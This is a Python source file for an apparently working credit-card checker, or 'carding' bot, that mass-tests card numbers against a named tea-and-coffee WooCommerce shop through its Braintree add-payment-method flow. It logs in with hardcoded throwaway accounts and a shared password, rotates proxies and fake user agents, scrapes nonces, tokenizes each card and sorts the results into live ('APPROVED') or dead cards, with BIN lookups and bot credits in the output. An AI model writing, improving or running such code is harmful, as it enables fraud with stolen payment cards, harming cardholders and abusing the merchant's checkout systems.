import httpx
import re
import random
import base64
import asyncio
import time
import os
import json
from user_agent import generate_user_agent

class BraintreeChecker:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.current_account_index = 0
        self.current_proxy_index = 0
        self.session_delay = 1
        
    def load_accounts(self):
        """Load accounts from the code or file"""
        self.accounts = [
            {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
            {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
            {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
            {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
            {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
            {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
            {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"}
        ]
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    def get_next_account(self):
        """Get next account with rotation"""
        if not self.accounts:
            return None
        
        account = self.accounts[self.current_account_index]
        self.current_account_index = (self.current_account_index + 1) % len(self.accounts)
        return account
    
    def get_next_proxy(self):
        """Get next proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str):
        """Parse proxy string to httpx format"""
        try:
            if ":" in proxy_str:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    # Format: ip:port:username:password
                    ip, port, username, password = parts
                    return f"http://{username}:{password}@{ip}:{port}"
                elif len(parts) == 2:
                    # Format: ip:port
                    ip, port = parts
                    return f"http://{ip}:{port}"
        except:
            pass
        return None
    
    def get_bin_info(self, bin_number):
        """Simple BIN lookup"""
        if not bin_number or len(bin_number) < 6:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown', 
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': ''
            }
        
        try:
            response = httpx.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data and data.get('scheme'):
                    return {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': data.get('country', {}).get('emoji', '')
                    }
        except:
            pass
        
        # Fallback pattern matching
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'UNKNOWN'
        
        return {
            'bank': f"{brand} BANK",
            'country': 'Unknown',
            'brand': brand,
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }

    def extract_processor_response(self, error_text):
        """Extract processor response from Braintree error"""
        try:
            # Look for processorResponse in JSON
            processor_match = re.search(r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"', error_text)
            if processor_match:
                code = processor_match.group(1)
                message = processor_match.group(2)
                return {'code': code, 'message': message}
            
            # Look for gatewayRejectionReason
            rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
            if rejection_match:
                reason = rejection_match.group(1)
                return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
                
        except:
            pass
        return None

    def extract_braintree_code(self, error_text):
        """Extract Braintree error code and message"""
        # Common Braintree processor response codes
        braintree_codes = {
            '2000': 'Do Not Honor',
            '2001': 'Insufficient Funds',
            '2002': 'Lost Card',
            '2003': 'Stolen Card', 
            '2004': 'Expired Card',
            '2005': 'Invalid Card Number',
            '2006': 'Invalid Expiration Date',
            '2007': 'No Account',
            '2008': 'Card Account Length Error',
            '2009': 'No Such Issuer',
            '2010': 'Card Issuer Declined CVV',
            '2011': 'Voice Authorization Required',
            '2012': 'Processing Error',
            '2013': 'Invalid Merchant',
            '2014': 'Pick Up Card',
            '2015': 'Account Not Found',
            '2016': 'Amount Error',
            '2017': 'Security Violation',
            '2018': 'Merchant Closed',
            '2019': 'Restricted Card',
            '2020': 'Call Issuer',
            '2021': 'Invalid PIN',
            '2022': 'Invalid ZIP',
            '2023': 'Invalid Address',
            '2024': 'Invalid CVV',
            '2044': 'Declined - Call Issuer',
            '2046': 'Declined - Restricted Card',
            '2056': 'Declined - Transaction Not Permitted',
            '2059': 'Declined - Suspected Fraud'
        }
        
        # Try to extract code from error text
        for code, message in braintree_codes.items():
            if code in error_text:
                return code, message
        
        # Try to match common patterns
        if 'cvv' in error_text.lower() or 'security code' in error_text.lower():
            return '2010', 'Card Issuer Declined CVV'
        elif 'insufficient' in error_text.lower():
            return '2001', 'Insufficient Funds'
        elif 'expired' in error_text.lower():
            return '2004', 'Expired Card'
        elif 'do not honor' in error_text.lower():
            return '2000', 'Do Not Honor'
        elif 'invalid number' in error_text.lower():
            return '2005', 'Invalid Card Number'
        elif 'stolen' in error_text.lower() or 'lost' in error_text.lower():
            return '2003', 'Stolen Card'
        elif 'pick up' in error_text.lower():
            return '2014', 'Pick Up Card'
        
        return None

    def extract_generic_response(self, error_text):
        """Extract generic response when no specific code found"""
        try:
            # Try to parse JSON error
            error_json = json.loads(error_text)
            if 'errors' in error_json:
                error_msg = error_json['errors'][0].get('message', 'Unknown error')
                return f'Braintree: {error_msg}'
        except:
            pass
        
        # Look for any error message pattern
        error_match = re.search(r'"message":"([^"]+)"', error_text)
        if error_match:
            return f'Processor: {error_match.group(1)}'
        
        return 'Processor: Transaction declined'

    def extract_site_error(self, response_text):
        """Extract error message from site response - Enhanced from finalb3mass11.py"""
        try:
            # WooCommerce error extraction - Enhanced pattern matching
            error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
            error_match = re.search(error_pattern, response_text, re.DOTALL)
            
            if error_match:
                error_msg = error_match.group(1).strip()
                # Enhanced response mapping from finalb3mass11.py
                if 'risk_threshold' in error_msg.lower():
                    return "RISK_BIN: Retry Later"
                elif 'do not honor' in error_msg.lower():
                    return "DECLINED - Do Not Honor"
                elif 'insufficient funds' in error_msg.lower():
                    return "DECLINED - Insufficient Funds"
                elif 'invalid' in error_msg.lower():
                    return "DECLINED - Invalid Card"
                else:
                    return error_msg
            
            # Alternative error extraction
            error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL)
            if error_match:
                error_content = error_match.group(1)
                li_matches = re.findall(r'<li>(.*?)</li>', error_content)
                if li_matches:
                    return li_matches[0]
                    
        except:
            pass
        
        return 'Payment declined by merchant'

    def determine_result_from_response(self, response_message):
        """Determine if response should be APPROVED or DECLINED based on message"""
        response_lower = response_message.lower()
        
        # APPROVED scenarios (including CVC issues, 3D secure, etc.)
        approved_indicators = [
            'payment method successfully added',
            'payment method added',
            'successfully added',
            'cvv',
            'security code', 
            'cvc',
            '2010',  # Card Issuer Declined CVV
            '2011',  # Voice Authorization Required
            '3d secure',
            'authentication required',
            'do not honor',  # Sometimes approved for CCN
            'insufficient funds'  # Sometimes approved for CCN
        ]
        
        # Check if any approved indicator is present
        for indicator in approved_indicators:
            if indicator in response_lower:
                return 'APPROVED'
        
        # DECLINED scenarios
        declined_indicators = [
            'invalid card number',
            'expired card',
            'stolen card',
            'lost card',
            'pick up card',
            'no such issuer',
            'invalid merchant',
            'restricted card'
        ]
        
        for indicator in declined_indicators:
            if indicator in response_lower:
                return 'DECLINED'
        
        # Default to DECLINED if no specific indicators found
        return 'DECLINED'
    
    async def check_single_card(self, card_line):
        """Check a single card with account rotation"""
        start_time = time.time()
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            n, mm, yy, cvc = parts
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" not in yy:
                yy = f'20{yy}'
            
            # Get account and proxy
            account = self.get_next_account()
            if not account:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No accounts available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            proxy_str = self.get_next_proxy()
            proxies = self.parse_proxy(proxy_str) if proxy_str else None
            
            # Process card
            result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
            elapsed_time = time.time() - start_time
            
            # Get BIN info
            bin_info = self.get_bin_info(n[:6])
            
            # Format result based on response
            if result == "APPROVED":
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
        """Process a single card with given account and proxy"""
        try:
            user = generate_user_agent()
            
            # Configure proxy if available
            transport = None
            if proxies:
                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
            
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=30,
                transport=transport
            ) as client:
                headers = {
                    'authority': 'www.tea-and-coffee.com',
                    'user-agent': user,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                }
                
                # Step 1: Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
                
                # Find login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    return 'DECLINED', 'Could not find login nonce'
                
                nonce = login_nonce_match.group(1)

                # Step 2: Login with account credentials
                data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    headers=headers,
                    data=data
                )
                
                # Check if login was successful
                if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
                    return 'DECLINED', 'Login failed'
                
                # Step 3: Navigate to add payment method
                headers.update({
                    'referer': 'https://www.tea-and-coffee.com/account/',
                })
                
                # Try custom payment method page first
                response = await client.get(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=headers
                )

                if response.status_code != 200:
                    response = await client.get(
                        'https://www.tea-and-coffee.com/account/add-payment-method/',
                        headers=headers
                    )

                # Find payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    return 'DECLINED', 'Could not find payment nonce'
                
                nonce = payment_nonce_match.group(1)

                # Find client nonce for Braintree
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    return 'DECLINED', 'Could not find client token nonce'
                
                client_nonce = client_nonce_match.group(1)
                
                headers.update({
                    'x-requested-with': 'XMLHttpRequest',
                    'referer': str(response.url),
                })

                # Step 4: Get client token
                data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    headers=headers,
                    data=data
                )
                
                if 'data' not in response.json():
                    return 'DECLINED', 'No data in client token response'
                    
                enc = response.json()['data']
                dec = base64.b64decode(enc).decode('utf-8')
                
                # Find authorization
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    return 'DECLINED', 'Could not find authorization fingerprint'
                authorization = authorization_match[0]

                # Step 5: Tokenize card
                headersn = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': user,
                }

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }
                
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=headersn,
                    json=json_data
                )

                # Check tokenization response
                if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
                    error_text = response.text
                    
                    # Extract Braintree processor response codes
                    processor_response = self.extract_processor_response(error_text)
                    if processor_response:
                        code = processor_response['code']
                        message = processor_response['message']
                        
                        # Determine result based on response content
                        result = self.determine_result_from_response(f"{code}: {message}")
                        return result, f'{code}: {message}'
                    
                    # Fallback to manual code extraction
                    braintree_code = self.extract_braintree_code(error_text)
                    if braintree_code:
                        code, message = braintree_code
                        result = self.determine_result_from_response(f"{code}: {message}")
                        return result, f'{code}: {message}'
                    
                    # If no specific code found, use generic extraction
                    generic_response = self.extract_generic_response(error_text)
                    result = self.determine_result_from_response(generic_response)
                    return result, generic_response
                        
                tok = response.json()['data']['tokenizeCreditCard']['token']

                # Step 6: Process payment
                current_url_str = str(response.url)
                if 'add-payment-method-custom' in current_url_str:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    wp_referer = '/account/add-payment-method-custom/'
                else:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    wp_referer = '/account/add-payment-method/'

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': referer,
                    'user-agent': user,
                }

                data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': 'visa',
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': wp_referer,
                    'woocommerce_add_payment_method': '1',
                }
                
                response = await client.post(
                    endpoint,
                    headers=headers,
                    data=data
                )
                
                response_text = response.text
                
                # Enhanced success detection from finalb3mass11.py
                success_indicators = [
                    'Nice! New payment method added', 
                    'Payment method successfully added',
                    'Payment method added',
                    'successfully added'
                ]
                
                # Check for success
                for indicator in success_indicators:
                    if indicator.lower() in response_text.lower():
                        return 'APPROVED', 'Payment method added successfully'
                
                # Check for WooCommerce success message
                if 'woocommerce-message' in response_text and 'error' not in response_text.lower():
                    # Extract success message from WooCommerce
                    success_match = re.search(r'woocommerce-message[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL)
                    if success_match:
                        success_msg = success_match.group(1).strip()
                        return 'APPROVED', f'Site: {success_msg}'
                    else:
                        return 'APPROVED', 'Payment method added successfully'
                
                # Check URL for success (redirect to payment methods page)
                if 'payment-methods' in str(response.url) or 'account' in str(response.url):
                    return 'APPROVED', 'Payment method added successfully'
                
                # Check for error using enhanced extraction from finalb3mass11.py
                elif 'woocommerce-error' in response_text:
                    site_error = self.extract_site_error(response_text)
                    if site_error:
                        result = self.determine_result_from_response(site_error)
                        return result, f'Site: {site_error}'
                    return "DECLINED", 'Site: Payment declined'
                
                else:
                    # Final check - if we got here but have a token, it might be approved
                    if tok:
                        return 'APPROVED', 'Payment method likely added (final fallback)'
                    return "DECLINED", 'Processor: Transaction declined'

        except Exception as e:
            return 'DECLINED', f'Error: {str(e)}'

# Global checker instance
braintree_checker = BraintreeChecker()

def initialize_braintree():
    """Initialize the Braintree checker"""
    braintree_checker.load_accounts()
    braintree_checker.load_proxies()
    return "✅ Braintree checker initialized"

async def check_card_braintree(cc_line):
    """Main function to check card via Braintree (single card)"""
    return await braintree_checker.check_single_card(cc_line)

async def check_cards_braintree(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = await check_card_braintree(cc_line)
        results.append(result)
        await asyncio.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Initialize the checker
    initialize_braintree()
    
    # Test with a single card
    async def test():
        test_cc = "4111111111111111|12|2025|123"
        print("Testing Braintree checker...")
        result = await check_card_braintree(test_cc)
        print(result)
    
    asyncio.run(test())
